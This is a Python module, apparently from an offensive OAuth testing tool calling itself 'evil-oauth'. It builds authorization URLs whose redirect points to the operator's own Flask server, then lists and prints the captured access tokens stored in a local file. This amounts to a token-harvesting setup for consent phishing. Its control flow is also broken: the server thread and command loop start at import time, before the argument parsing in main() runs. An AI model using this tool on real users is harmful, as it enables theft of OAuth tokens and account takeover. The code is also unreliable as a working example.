import argparse
import logging
import threading
from . import flask_app, __version__, redirect_uri_endpoint

def set_log_level(verbose):
	log_format = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'

	if verbose == 0:
		logging.basicConfig(level=logging.WARNING, format=log_format)
	elif verbose == 1:
		logging.basicConfig(level=logging.INFO, format=log_format)
	elif verbose >= 2:
		logging.basicConfig(level=logging.DEBUG, format=log_format)

def main():
	parser = argparse.ArgumentParser(prog='oauth2-sec-test')
	parser.add_argument('-c', '--client-id', required=True, help='OAuth2.0 Client ID')
	parser.add_argument('-r', '--response-type', default='token', 
		help='OAuth 2.0 Response Type [code (AuthZ "Code" Flow) | token (Implicit "Token" Flow)]')
	parser.add_argument('-s', '--scope', required=True, help='OAuth2.0 Scopes')
	parser.add_argument('-e', '--endpoint', required=True, help='OAuth2.0 Target URI Endpoint')
	parser.add_argument('--redirect_server', default='127.0.0.1:5000', help='OAuth2.0 Target URI Endpoint')
	parser.add_argument('-v', '--verbose', action='count', default=0, help='Increase verbosity level')
	args = parser.parse_args()

	set_log_level(args.verbose)
	logging.info(f'evil-oauth {__version__}')

	redirect_uri = f'https://{args.redirect_server}/{redirect_uri_endpoint}'

	logging.info(f'Endpoint: {args.endpoint}')
	logging.info(f'Client ID: {args.client_id}')
	logging.info(f'Scope: {args.scope}')
	logging.info(f'Response Type: {args.response_type}')
	logging.info(f'Redirect URI: {redirect_uri}')
	logging.info(f'{args.endpoint}?client_id={args.client_id}&scope={args.scope}&'
		     f'response_type={args.response_type}&redirect_uri={redirect_uri}')
	
	# Storare Arguments for routes.py
	flask_app.config['ENDPOINT'] = args.endpoint
	flask_app.config['CLIENT_ID'] = args.client_id
	flask_app.config['SCOPE'] = args.scope
	flask_app.config['RESPONSE_TYPE'] = args.response_type
	flask_app.config['REDIRECT_URI'] = redirect_uri

# Import Routes
from . import routes

def run_flask_app():
	flask_app.run(ssl_context='adhoc', debug=True, use_reloader=False)

def show_tokens(token_id=None):
    try:
        with open('tokens.txt', 'r') as file:
            tokens = file.readlines()

        if not tokens:
            print("No tokens found.")
            return

        if token_id is not None:
            # Display the full token for the given ID
            for line in tokens:
                parts = line.strip().split(',')
                if len(parts) == 2 and parts[0] == str(token_id):
                    _, full_token = parts
                    print(f"Full token for ID {token_id}: {full_token}")
                    return
            print(f"No token found with ID {token_id}")
        else:
            # Print table header
            print(f"{'ID':<5} | {'Token':<10} | {'Date':<10} | {'Time':<10}")
            print("-" * 50)  # Adjust the length based on your table width

            # Print each token in brief
            for line in tokens:
                parts = line.strip().split(',')
                if len(parts) == 2:
                    id, token = parts
                    token_preview = token[:7] + "..."
                    print(f"{id:<5} | {token_preview:<10}")
                else:
                    print("Invalid line format:", line)

    except FileNotFoundError:
        print("No tokens found.")

def command_loop():
    while True:
        cmd = input("Enter command: ")
        if cmd.startswith("tokens"):
            parts = cmd.split()
            if len(parts) == 2 and parts[1].isdigit():
                show_tokens(token_id=parts[1])
            else:
                show_tokens()
        elif cmd == "exit":
            break
        else:
            print("Unknown command.")

flask_thread = threading.Thread(target=flask_app.run)
flask_thread.start()

command_loop()

if __name__ == '__main__':
	main()
